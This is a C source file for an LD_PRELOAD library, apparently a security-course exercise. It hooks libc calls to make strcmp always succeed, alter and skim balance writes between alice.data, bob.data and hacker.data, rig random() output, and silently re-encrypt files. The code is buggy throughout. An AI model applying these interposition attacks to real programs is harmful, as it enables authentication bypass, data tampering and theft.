#include<stdint.h>
#include <ctype.h>
#include<stdio.h>
#include<dlfcn.h>
//#include <fcntl.h>
#include<string.h>
#include <sys/wait.h>
#include<errno.h>
#include<execinfo.h>
#include<sys/types.h>
#include<unistd.h>
#include<stdarg.h>
#include<stdlib.h>
/* We aren't providing much code here.  You'll need to implement quite a bit
 * for your library. */

/* Declarations for the functions in part2_hash.cc, so that we don't need an
 * extra header file. */
void malloc_insert(size_t size);
void malloc_dump();
void so_allocate();
void so_deallocate();


static int ignoreMalloc = 0;
int optiontracker=0;
int option=0;
int filedata3=0;
int filedata4=0;
int previousvalue=0;
int alicedescriptor=0;
int bobdescriptor=0;
int existingdif=0;
int randomtrack=0;
int openfile=0;
int ignoreOpen=0;
int lasthacker=1;
int hackerkey=9;
int flag=0;
int fakefiledescrip=2;
int currentlistpos=0;
//int randtrack=0;
int lastnonhack=-1;
static int ignoreWrite=0;
char *listoffiles[8]={"0","0", "0","0","0","0","0","0"};
int valueinfile[8];
int fakefilelist[8];
int realfiledescr[8];
char filename[20];
int ignoreClose=0;
int filestart=0;
//FILE *outFile;
char* fileoutline[8]={"0","0", "0","0","0","0","0","0"};
char* actualfile[8]={"0","0", "0","0","0","0","0","0"};
char* pathlist[8]={"0","0", "0","0","0","0","0","0"};
char* encryoutline[8];
void ourencrypt(char *input, char *key, char *output) {
  int i;
  for(i = 0; i < strlen(input); i++) {
    int j;
    for (int j=0; j <strlen(key); j++) {
      output[i] = input[i] ^ key[j];
    }
  }
  //  return output;
}


//int getfilepos(int fn,

char* getfile(char *a[], int fd)
{
  char proclink[0xFFF];
  char filename[0xFFF];
  sprintf(proclink, "/proc/self/fd/%d", fd);
  ssize_t r=readlink(proclink, filename, 40);
  // printf("%s\n", filename);
  filename[r]='\0';
  printf("%c\n",filename[0]);
  char *x=(char*)malloc(sizeof(char*));
  
  for(int i=0; i<8;i++){
    if(a[i][0]==filename[0]){
      printf("%c\n", a[i][0]);
      strcpy(x,a[i]);

    }
  }
  return x;
  
}


char *updatedgetfilename(int fno){
  int MAXSIZE = 1000;
  char proclnk[1000];
  //char filename[1000];
  char* filename=(char*)malloc(1000*sizeof(char));
  sprintf(proclnk, "/proc/self/fd/%d", fno);
  
  ssize_t r=readlink(proclnk, filename, MAXSIZE);
  
  filename[r]='\0';
  fprintf(stderr,"filename %s\n", filename);
  return filename;
}

char* getfilename(int fno){
  //  int MAXSIZE=0xFFF;
  char proclink[20];
  char* filename=malloc(sizeof(char)*20);
  // char filename[20];
  sprintf(proclink, "/proc/self/fd/%d", fno);
  ssize_t r=readlink(proclink, filename, 40);
  // printf("%s\n", filename);
  filename[r]='\0';
 
  memset(proclink, '\0',20);
  return filename;
}



int findsubstr(char *needle, char* haystack){
  char buf[strlen(needle)];
  int found=0;
  for(int i=0; i<strlen(haystack);i++){
    memcpy(buf, &haystack[i], strlen(needle));
    if(strncmp(buf, needle, strlen(needle))==0){
      found=1;
      break;
    }
    //printf("%s\n", buf);
  }
  return found;
}

int fork(void){                                                            
  static int (*origFork) (void)=NULL;
 
  if(!origFork){                                                           
									   
    origFork= (int (*) (void))dlsym(RTLD_NEXT,"fork");                      
  }
  pid_t childval=origFork();
  int status;                                                              

  if(childval>0){
    pid_t wpid=waitpid(childval, &status, 0);
    while(1){
      if(WIFSTOPPED(status))
	{
	  printf("Child stopped by signal signal %d\n", WTERMSIG(status));
	  break;
	}
      else if (WIFEXITED(status)){
	printf("Child ended normally.n");
	break;

      }

      else if(WIFSIGNALED(status)){
	printf("Child killed by signal %d\n", WTERMSIG(status));
	break;
      }
    }
  }
  return childval;
}
uid_t getuid(void){
  static uid_t (*origgetuid)()=NULL;
  
  if(!origgetuid){
    origgetuid=(uid_t (*) ())dlsym(RTLD_NEXT, "getuid");
  }
  uid_t retuid=origgetuid();
  if(option==5){
    printf("This is the UID = %d\n", retuid);
  }
  return retuid;
}

int close(int fd){
  static int (*origClose)(int) = NULL;
  if(!origClose){
    origClose=(int (*) (int))dlsym(RTLD_NEXT, "close");
  }
  if(option==3){
    if(ignoreClose==0){
    
    int j=0;
    for(int i=0;i<8;i++){
      if(fakefilelist[i]==fd){
	j=i;
      }
    }

    char valfile[5];
    memset(valfile, '\0',5);
    sprintf(valfile, "%d\0", valueinfile[j]);
    printf("This is value to be written %s\n", valfile);
    printf("This if file we are writing to %s\n", listoffiles[j]);
    //ignoreOpen=1;
    
    //printf("This is who we are really writing to (1st) %s\n", getfilename(fd));
    //ignoreWrite=1;
    ignoreOpen=1;
    fd=open(listoffiles[j], 2);
    //lseek(fd, 0, SEEK_SET);
    ignoreWrite=1;
    write(fd, valfile, strlen(valfile));
    //close(fd);
    return strlen(valfile);
    }
    else{
      printf("reached here\n");
      int x=origClose(fd);
      ignoreClose=0;
      return x;
    }
  }

   return origClose(fd);
}
  


void *malloc(size_t bytes)
{
	static void* (*origMalloc)(size_t) = NULL;
	if(!origMalloc)
	{
		origMalloc = (void* (*)(size_t))dlsym(RTLD_NEXT, "malloc");
	}

	if(ignoreMalloc)
	{
		return origMalloc(bytes);
	}

	ignoreMalloc = 1;
	malloc_insert(bytes);
	ignoreMalloc = 0;

	return origMalloc(bytes);
}

off_t lseek(int fd, off_t offset, int whence){
  static off_t (*origlseek) (int, off_t, int)=NULL;
  if(!origlseek){
    origlseek=(off_t (*) (int, off_t, int))dlsym(RTLD_NEXT, "lseek");
  }
  if(option==3){
    return 0;
  }
  else{
    return origlseek(fd, offset, whence);
  }
  
}


int open(const char *pathname,int flags) //open(1, asdsad)
{
  //  printf("PATH COMMENT PATH %s\n", pathname);
	static int (*originopen) (const char *,int)=NULL;
	if(!originopen)
	{
		originopen=(int (*)(const char *,int))dlsym(RTLD_NEXT,"open");
	}

	  //strncpy(filename, pathname, 20);
	
	

	if(flags==0&&atoi(pathname)<10)
	{
	        
		option=atoi(pathname);
		return originopen(pathname,flags);
 	}
	if(option==7){
	  int j=0;
	  ignoreOpen=0;
	  for(int i=0; i<8; i++){
	    if(strcmp(pathlist[i], pathname)==0){
	      ignoreOpen=1;
	      j=i;
	    }
	  }
	  if(ignoreOpen==0){ 
	    char filename[strlen(pathname)-5];
	    memset(filename, 0, strlen(filename));
	    printf("filename length %d\n", strlen(pathname)-5);
	    for(int i=0; i<strlen(pathname)-5; i++){
	      filename[i]=pathname[i];
	    }
	    printf("This is filename %s\n", filename);
	    //printf("%d\n", filestart);
	    fileoutline[filestart]=(char*)malloc(sizeof(char*));
	    strcpy(fileoutline[filestart], filename);
	    char fileExtension[]=".enc";
	    char outFileName[strlen(fileExtension)+strlen(filename)];
	    //memset(outFileName, '\0', strlen(outFileName));
	    strcpy(outFileName, filename);
	    strcat(outFileName, fileExtension);
	    printf("This is new file name %s\n", outFileName);
	    actualfile[filestart]=(char*)malloc(sizeof(char*));
	    strcpy(actualfile[filestart], outFileName);
	    pathlist[filestart]=(char*)malloc(sizeof(char*));
	    strcpy(pathlist[filestart],pathname);
	    filestart++;
	    FILE *outFile=fopen(outFileName, "w+");
	    //outFile=fopen(outFileName, "w+"); 
	    FILE *fp=fopen(pathname, "r");
	    char buff[1000];
	    memset(buff, '\0', 1000);
	    char encrypted[1000];
	    memset(encrypted,0,1000);
	    fgets(buff, 999, fp);
	    printf("value stored in file is %s and length is %d\n", buff, strlen(buff));
	    
	    ourencrypt(buff, filename, encrypted);
	    printf("encrypted val is %s\n", encrypted);
	    fputs(encrypted, outFile); 
	    //fprintf(outFile, encrypted);
	    int x=originopen(outFileName, flags);
	    memset(buff, 0, 1000);
	    memset(outFileName, 0, strlen(outFileName));
	    memset(filename, 0, strlen(filename));
	    memset(encrypted, 0, 1000);
	    fclose(fp);
	    fclose(outFile);
	    
	    return x;
	  }
	  else{
	    printf("this is pathname %s\n", pathname);
	    printf("this is who we are opening %s\n", actualfile[j]);
	    int x=originopen(actualfile[j], flags);
	    printf("This is ignoreOpen %d\n", ignoreOpen);
	    
	    return x;
	  }
	}
	if(option==3){
	  if(ignoreOpen==0){
	  int flag=0;
	  int i=0;
	  for(i; i<8;i++)
	    {
	      if(strcmp((listoffiles[i]), pathname)==0){
		

		flag=1;
		break;

	    }
	    else{
	      printf("%s\n", listoffiles[i]);
	      
	    }
	      // FILE *fp=originopen(pathname, flags);  
	
	    }

	  if(flag==0){
	   listoffiles[currentlistpos]=(char*)malloc(sizeof(char*));
	   
	   strncpy(listoffiles[currentlistpos], pathname, strlen(pathname));
	   
	   //currentlistpos=currentlistpos+1;
	   // 
	  }
	  FILE* fp=fopen(pathname, "r");
	  // printf("Descriptor %d file %s", fp,pathname);
	  //int fd=fileno(fp);
	  /* int fd=fileno(fp);
	  lseek(fd, 0, SEEK_SET);
	  char intinfile[20];
	  memset(intinfile,'/0', 20);
	  read(fd, intinfile, 20);*/
	  char intinfile[20];
	  memset(intinfile,'\0',20);
	  fgets(intinfile, 20, fp); 
	  int fileval=atoi(intinfile);
	  printf("fileval is : %d\n", fileval);
	  realfiledescr[currentlistpos]=fileno(fp);
	  valueinfile[currentlistpos]=fileval;
	  

	  

	  //fclose(fp);
	  fakefiledescrip++;
	  fakefilelist[currentlistpos]=fakefiledescrip;
	  currentlistpos++;
	  fclose(fp);
	  return fakefiledescrip;
	  }
	  else{
	    int x=originopen(pathname, flags);
	    printf("This is ignoreOpen %d\n", ignoreOpen);
	    ignoreOpen=0;
	    return x;

	  }
	}
	  
	if(option==5){
	  
	  printf("opening file %s\n", pathname);
	  // strcpy(lasttwofiles[openfile%2], pathname);
	  if(strcmp(pathname, "hacker.data")==0){
	  //if(lastnonhack==1){
	    hackerkey=lastnonhack;
	  }
	  
	  openfile+=1;
	  
	  //randomtrack=0;
	  return originopen(pathname,  flags);
	}


	if(option==2){
	  printf("look out");
	  if(strncmp("alice.data", pathname, 10)==0){
	    alicedescriptor=originopen(pathname,flags);
	    printf("alice descriptor %d\n", alicedescriptor);
	    return alicedescriptor;
	  }

	  if(strncmp("bob.data", pathname, 8)==0){
	    bobdescriptor=originopen(pathname,flags);
	    printf("bob descriptor %d\n", bobdescriptor);
	    return bobdescriptor;
	  }
	  else{
	    printf("reached hereh");
	    return originopen(pathname,flags);
	  }
	  


	}






	else
	{
		return originopen(pathname,flags);
	}
}

int ftruncate(int fd, off_t length){
  static int (*origtruncate) (int, off_t)=NULL;
  if(!origtruncate){
    origtruncate=(int (*) (int, off_t)) dlsym(RTLD_NEXT, "ftruncate");
  }
  if(option==3){
    int j=0;
    for(int i=0; i<8;i++){
      if(fd==fakefilelist[i]){
	j=i;
      }
    }
    valueinfile[j]=0;
    return 0;
  }
  if(option==4 || option==5){
    
    //strncpy(filename, pathname, 20);

    
    char valuestr[20];
    memset(valuestr,'\0', 20);
    lseek(fd, 0, SEEK_SET);
    read(fd, valuestr, 20);
    previousvalue=atoi(valuestr);
    printf("file: %d value: %d\n", fd, previousvalue);
    return origtruncate(fd,length);
  }
 
 
 
 
 

 
  else{
    return origtruncate(fd, length);
  }

}

long int random(void){
  
  static long int (*originrandom) (void)=NULL;
  if(!originrandom){
    originrandom=(long int (*) (void)) dlsym (RTLD_NEXT, "random");
  }
  if(option==5){
    randomtrack=randomtrack+1;
    printf("%d\n", randomtrack);
    long int returnval;
    printf("openfile %d\n", openfile);
   
    if(randomtrack-openfile>=3){
      
      randomtrack=randomtrack-1;
      if(hackerkey==9){


	
	return originrandom();
      }
      else{
	return hackerkey;
      }
    }
    

    if(randomtrack%2!=0){
      return originrandom();
      
    }

    else{
      if(hackerkey==9){
	lastnonhack++;
	return lastnonhack%8;
      }
      else{
	return hackerkey;
      }
    }
    // optiontracker+=1;
     
    /*if(optiontracker%2!=0){

	printf("%d\n", optiontracker);
	optiontracker+=1;
	return 0;
      }
      else{
	//printf("%d\n", optiontracker);
	//return 0;
	//	optiontracker+=1;
	printf("%d\n", optiontracker);
	optiontracker+=1;
	return originrandom();
	}*/
    
    //if(lastnonhack==0 && (randomtrack!=3)){
      // printf("%d\n", lastnonhack);
    /* if((lastnonhack==0) || (flag==1)){
       lastnonhack=1;
       printf("flag %d\n",flag);
       flag=0;
       lasthacker=0;
       returnval=originrandom();
       printf("%lu %ld\n", returnval);
       return returnval;
       }*/
       
    /* else if(randomtrack==3){
      lastnonhack=0;
      lasthacker=1;
      randomtrack=0;
      random();
      return random();
      
      }*/
    /*else if(lasthacker==0 && (flag==0)){
      printf("%d\n", 0);
      
      lasthacker=1;
      lastnonhack=0;
      return 0;

    }
    else{
      return originrandom();
      }*/
      //optiontracker=0;
  }
  else{
   
    return originrandom();
  }
}


ssize_t read(int fd, void *buf, size_t nbyte){
  static ssize_t (*origRead) (int, void*, size_t)=NULL;
  if(!origRead){
    origRead=(ssize_t (*) (int, void*, size_t))dlsym(RTLD_NEXT, "read");
   }
    if(option==7){
      char newbuf[1000];
      memset(newbuf, '\0', 1000);
      char* filereadfrom=(char*)malloc(1000*sizeof(char));
      strcpy(filereadfrom, updatedgetfilename(fd));
      // char* filereadfrom=(char*)malloc(1000*sizeof(char));
      fprintf(stderr, "We are reading from file %s\n", filereadfrom);
      int pos=0;
      for(int i=0; i<8; i++){
	if(findsubstr(actualfile[i], filereadfrom)){
	  pos=i;
	  break;
	}
      }

      /*  ignoreOpen=1;
       printf("file we actually want to open %s\n", actualfile[pos]);
       int realfd=open(actualfile[pos], 2);
       lseek(realfd, 0, SEEK_SET);
       ssize_t x=origRead(realfd, newbuf, 1000);*/
      FILE *file = fopen(actualfile[pos], "r");
      fgets(newbuf, 1000, file);  

      /*int a;
      int start=0;
      /*do {
	a=fgetc(file);
	
	printf("First char of file %s is %c\n", actualfile[pos], (char)a);
	newbuf[start]=(char)a;
	start=start+1;
	}while(a!=EOF);
      
       fgets(newbuf, 1000, file);
      
      //int realfd=open(actualfile[pos], 2);
      
      //lseek(realfd, 0, SEEK_SET);
      
      //ssize_t x=origRead(realfd, newbuf, 1000);
      printf("value stored in encrypted file is %s\n", newbuf);
      











      
      /*   lseek(fd, 0, SEEK_SET);
     
      ssize_t x=origRead(fd, newbuf, 1000);
      printf("value stored in encrypted file is %s\n", newbuf);
      char* filereadfrom=(char*)malloc(1000*sizeof(char));
      // memset(filereadfrom, '\0', 1000);
      strcpy(filereadfrom, updatedgetfilename(fd));
      fprintf(stderr, "We are reading from file %s\n", filereadfrom);
      int pos=0;
      for(int i=0; i<8; i++){
	if(findsubstr(actualfile[i], filereadfrom)){
	  pos=i;
	  break;
	}   
	}*/
      
      char *key=(char*)malloc(sizeof(char)*strlen(actualfile[pos]));
      strcpy(key,fileoutline[pos]);
      fprintf(stderr, "Key is %s\n", key);
      //char *c=(char*)malloc(sizeof(char)*strlen(buf));
      char *c=(char*)(buf);
      memset(buf, 0, strlen(buf));
     

     
     ourencrypt(newbuf,key, c);
     fprintf(stderr, "decrypted val %s\n", c);
      ssize_t ret=strlen(c);
      
      memset(newbuf, '\0', 1000);
      memset(filereadfrom, '\0', 1000);
      /*for(int i=0; i<strlen(c);i++){
	if(!isdigit(c[i])){
	  c[i]='\0';
	}

	}*/
      printf("Value stored in buf is %s\n", (char*)buf);
      //memset(c, 0, sizeof(c));
      //return x;
      buf=c;
      // fclose(file);
      //int y=strlen(buf);
      
      return ret;
      /*int pos=0;
      for(int i=0; i<8; i++){
	if(findsubstr(actualfile[i], buff)){
	  pos=i;
	  break;
	}
      }
      char* file=(char*)malloc(sizeof(char*));
      file=getfile(actualfile, fd);
      printf("opening file %s\n", file);
      int c=0;
      // char* key=getactualfile(fd, file);
      FILE* outFile=fopen(file, "r");
      if(outFile==NULL){
	printf("file is bullshit\n");
      }
      char newbuff[1000];
      int i=0;
       do{
	c=fgetc(outFile);
	printf("%d\n", c);
	if(feof(outFile)){
	  break;
	}
	newbuff[i]=(char)c;
       
	i=i+1;
	}while(1);
      
	
      //memset(newbuff, '\0', 1000);
      //fgread(outFile);
	

      
      printf("The value stored in buffer is %s\n", newbuff);
      memset(newbuff, '\0', 1000);
      // memset(buff, '\0', 30);
      /*while(fgets(buff, 999, encryptfile)!=NULL){ //read from file
	char encrypted[1000];
	encrypt(buff, 

      }
      
      memset(encrypted, '\0', 1000);
      memset(buff, '\0', 1000);
      return updatebuf;*/


    }
  if(option==3){
    int j=0;
    for(int i=0; i<8; i++){
      //printf("hey bitch %d\n", fakefilelist[i]);
      if(fakefilelist[i]==fd){
	j=i;
	break;
      }
    }
      //char valfile=(char)valueinfile[j];
      char valfile[30];
      memset(valfile, '\0', 30);
      //printf("%d\n", valueinfile[j]); 
      sprintf(valfile,"%d\0",valueinfile[j]);
      printf("this is valfile %s\n", valfile);
      strcpy((char*)buf, valfile);
      return (strlen(buf));
    
  }
    //char currentfile[30];

    //memset(currentfile, '\0', 30);

    //strcpy(currentfile, getfilename(fd));
    
    //  int filepos=0;
    //for(int i=0; i<8; i++){
    // int bob=0;
    // bob=findsubstr(listoffiles[i],currentfile);
    // if(bob==1){
    //	filepos=i;
	//  }
	//  }
    
   

  
    return origRead(fd, buf, nbyte);
  

}
ssize_t write(int fd, const void * buf, size_t count)
{
	static ssize_t (*originwrite)(int,const void *,size_t)=NULL;
	if(!originwrite)
	{
		originwrite=(ssize_t (*)(int,const void *,size_t))dlsym(RTLD_NEXT,"write");
	}
	/*	if(ignoreWrite){
	  return originwrite(fd, buf, count);
	  
	  }*/
	if(option==3){
	  if(ignoreWrite==0){
	  int filewewantpos=0;
	  for(int i=0; i<8; i++){
	    if(fakefilelist[i]==fd)
	    {
	      printf("file descriptor is %d\n", fakefilelist[i]);
	      filewewantpos=i;
	    }
	  }
	  
	   valueinfile[filewewantpos]=atoi(buf);
	   return (strlen(buf));
	  }
	 else{
	   //ignoreWrite=0;
	   // printf("This is ignoreWrite %d\n", ignoreWrite);
	   //    printf("This is who we are really writing to %s\n", getfilename(fd)); 
	     ssize_t retval=originwrite(fd, buf, count);
	     ignoreWrite=0;
	     ignoreClose=1;
	     close(fd);
	     return retval;
	  }
	}
        if(option==7){
	  char *valuetoencrypt=(char*)buf;
	  fprintf(stderr, "Value we are writing (before encryption)  %s\n", valuetoencrypt);
	  char currentfile[30];
	  memset(currentfile, '\0', 30);

	  strcpy(currentfile, updatedgetfilename(fd));
	  int foundfile=0;
	  int j=0;
	  for(int i=0; i<8; i++){
	    // printf("File outline %s\n", fileoutline[i]);
	    foundfile=findsubstr(fileoutline[i], currentfile);
	    if(foundfile){
	      j=i;
	      break;
	    }
	  }
	   
	  char* key=fileoutline[j];
	  printf("Encryption key %s\n", key);
	  char *encrypted=(char*)malloc(sizeof(char)*strlen(valuetoencrypt));
	  memset(encrypted, 0, strlen(encrypted));
	  ourencrypt(valuetoencrypt, key, encrypted);
	  
	  fprintf(stderr, "Value we are writing (after encryption) %s\n", encrypted);
	  /* ignoreOpen=1;
	     int fd=open(actualfile[j],2);*/
	  FILE *filewewriteto=fopen(actualfile[j], "w");
	  
	  printf("Encrypted value we write %s\n", encrypted);
	  printf("We are writing to %s\n", actualfile[j]);
	  fputs(encrypted, filewewriteto);
	 
	 
	 
	 
	 
	 
	 
	 
	 
	   
	  fclose(filewewriteto);
	  ssize_t retval=strlen(actualfile[j]);
	  //ssize_t retval=originwrite(fd, encrypted, count);
	  //close(fd); //added
	  return retval;

	}
	if(option==2)
	{
	        
		
		
	  
	  char currentfile[30];
	 
	  memset(currentfile, '\0', 30);
	 
	  strcpy(currentfile, getfilename(fd));
	  
	  //bob=strstr("bob", getfilename(fd));
	  //alice=strstr("alice", getfilename(fd));
	  printf("%s\n", currentfile);
	  int bob=0;
	  bob=findsubstr("bob", currentfile);
	  printf("%d\n", bob);
	  if(bob){
	    int n=atoi(buf);
	    n-=200;
	    char s[10];
	    sprintf(s, "%d\0",n);

	    // memset(findbob,'\0', 30);
	    
	    return originwrite(fd,s,strlen(s));

	  }
	  else{
	    
	    int n=atoi(buf);
	    n+=200;
	    char s[10];
	    sprintf(s, "%d\0",n);
	    //   memset(findalice,'\0', 30);
	    
	    return originwrite(fd,s,strlen(s));

	  }
	 
	}
	else if(option==4){
	  printf("Amount being transferred %s\n", buf);
	  int transfer=atoi(buf);
	  

	 
		 
	  //reduce money in existing account 
	 
	  if(previousvalue>=transfer){
	    //ftruncate(fd,0);
	    /* if(previousvalue>transfer){
	      transfer=previousvalue-10;
	      }*/
	    lseek(fd, 0, SEEK_SET);
	    printf("%s\n", filename);
	    printf("amount in dest (before transfer-no decrease) %d\n", previousvalue);
	    
	    printf("amount in transfer %d\n", transfer);
	    existingdif+=(previousvalue-transfer); //keep track of
						   //lost money
	    printf("lost money %d\n", existingdif);
	    printf("Written %s\n", buf);
	    return originwrite(fd, buf, count);

	    
	  }
	  
	  int constant=4;
	  
	 
	   
	  transfer=previousvalue+existingdif;
	   
	  // existingdif-=(transfer-previousvalue);
	 
	  transfer=transfer-constant;
	  char transferbuf[20];
	  sprintf(transferbuf, "%d\n",transfer);
	 
	  lseek(fd, 0, SEEK_SET);
	  printf("amount in dest (before transfer) %d\n", previousvalue);
	  printf("amount in transfer (decreased) %d\n", transfer);
	  printf("amount in transferbuf %s\n", transferbuf);
	  originwrite(fd, transferbuf, sizeof(transferbuf));
	  int hackfd=open("hacker.data", 2);
	 
	  char hackerbuf[20];
	  memset(hackerbuf, '\0', 20);
	  lseek(hackfd, 0, SEEK_SET);
	  read(hackfd, hackerbuf, 20);
	  
	  int hackermoney=atoi(hackerbuf);
	  printf("amountof hackermoney %d\n", hackermoney);
	  hackermoney+=constant;
	  printf("amountof hackermoney %d\n", hackermoney);
	 memset(hackerbuf, '\0', 20);
	  // char newbuf[20];
	  sprintf(hackerbuf, "%d",hackermoney);
	  printf("in hackerbuf %s", hackerbuf);
	 
	  lseek(hackfd, 0, SEEK_SET);
	  existingdif=0;
	  return originwrite(hackfd,hackerbuf,sizeof(hackerbuf));
	 



	  
	}
	/*	else if(option==5){
	  int transfer=atoi(buf);
	  
	  if(previousvalue>=transfer){
	    //ftruncate(fd,0);
	    lseek(fd, 0, SEEK_SET);
	    printf("amount in dest (before transfer-no decrease) %d\n", previousvalue);
	    printf("amount in transfer %d\n", transfer);
	    return originwrite(fd, buf, count);

	    //return 1;
	  }
	  int transferamount=transfer-previousvalue;
	  printf("transfer amount %d\n", transferamount);
	  char prevbuf[20];
	  memset(prevbuf, '\0',20);
	  sprintf(prevbuf, "%d\0", previousvalue);
	  lseek(fd, 0, SEEK_SET);
	  originwrite(fd, prevbuf, 20);
	  char hackerbuf[20];
	  memset(hackerbuf, '\0', 20);
	  int hackerdf=open("hacker.data", 2);
	  lseek(hackerdf,0,SEEK_SET);
	  read(hackerdf, hackerbuf,sizeof(hackerbuf));
	  int hackermoney=atoi(hackerbuf);
	  hackermoney+=transferamount;
	  //  printf("hacker money %d\n", hackermoney);
	   memset(hackerbuf, '\0', 20);
	   sprintf(hackerbuf,"%d\0", hackermoney);
	  //lseek(hackerdf, 0, SEEK_SET);
	  printf("hacker money %s\n", hackerbuf);
	  lseek(hackerdf,0,SEEK_SET);
	  return originwrite(hackerdf, hackerbuf, sizeof(hackerbuf));
	  

	  }*/
	/*else if(option==4)
		{
		  char* arrayoffd[8];
		  arrayoffd[0]=fopeN(
		       if(fd==5)
		{
			char hackerbuf[20];
			filedata4=atoi(buf);
			int gap=6;
			printf("filedata3=%d,filedata4=%d,gap=%d\n",filedata3,filedata4,gap);
			int hackerfd=open("hacker.data",2);
			printf("hackerfd=%d\n",hackerfd);
			lseek(hackerfd, 0, SEEK_SET);
			read(hackerfd, hackerbuf, 20);
			int hackerdata=atoi(hackerbuf);
			if(filedata3>gap/2)

			  {
				filedata3-=gap/2;
				hackerdata+=gap/2;
			}
			else
			{
				hackerdata+=filedata3;
				filedata3=0;
			}
			if(filedata4>gap/2)
			{
				filedata4-=gap/2;
				hackerdata+=gap/2;
			}
			else
			{
				hackerdata+=filedata4;
				filedata4=0;
			}
			char s1[20],s2[20],s3[20];
			sprintf(s1, "%d\0",hackerdata);
			printf("hackerdata=%s",s1);
			ftruncate(hackerfd, 0) ;
			lseek(hackerfd, 0, SEEK_SET);
			originwrite(hackerfd,s1,strlen(s1));
			close(hackerfd);
			sprintf(s2, "%d\0",filedata3);
			printf("filedata3=%s",s2);
			originwrite(4,s2,strlen(s2));
			sprintf(s3, "%d\0",filedata4);
			printf("filedata4=%s",s3);
			return originwrite(5,s3,strlen(s3));
		}
		else if(fd==4)
		{
			filedata3=atoi(buf);//purpose: record balance of account
			return strlen(buf);
		}
		else
		{
			return originwrite(4,buf,strlen(buf));
		}
		}*/
	else
	{
	        
		return originwrite(fd,buf,count);
		}
}

int strcmp(const char* str1, const char* str2)  
{  
    static int (*originstrcmp)(const char*,const char*)=NULL;
    if(!originstrcmp)
   	{
   		originstrcmp=(int (*)(const char *,const char*))dlsym(RTLD_NEXT,"strcmp");
   	}
   	if(option==1)
   		return 0;
   	else
   	{
   		return originstrcmp(str1,str2);
   	}
}  
// int random(int n)
// {
// 	static int (*originrandom)(int)=NULL;
// 	if(!originrandom)
// 	{
// 		originrandom=(int (*)(int))dlsym(RTLD_NEXT,"random");
// 	}
// 	else
// 	{
// 		return originrandom(n);
// 	}
// }
__attribute__((destructor))
  /*static int getfd(char *pathname){
  return open(pathname, 0);

}*/

/*static char* getfilename(FILE* fp){
  int fno=fileno(fp);
  char proclink[20];
  char filename[20];
  sprintf(proclink, "/proc/self/fd/%d", fno);
  ssize_t r=readlink(proclink, filename, 20);
  filename[r]='\0';
  return filename;
  }*/

static void deallocate()
{
	malloc_dump();
	so_deallocate();
}


__attribute__((constructor))
static void allocate()
{
	so_allocate();
}

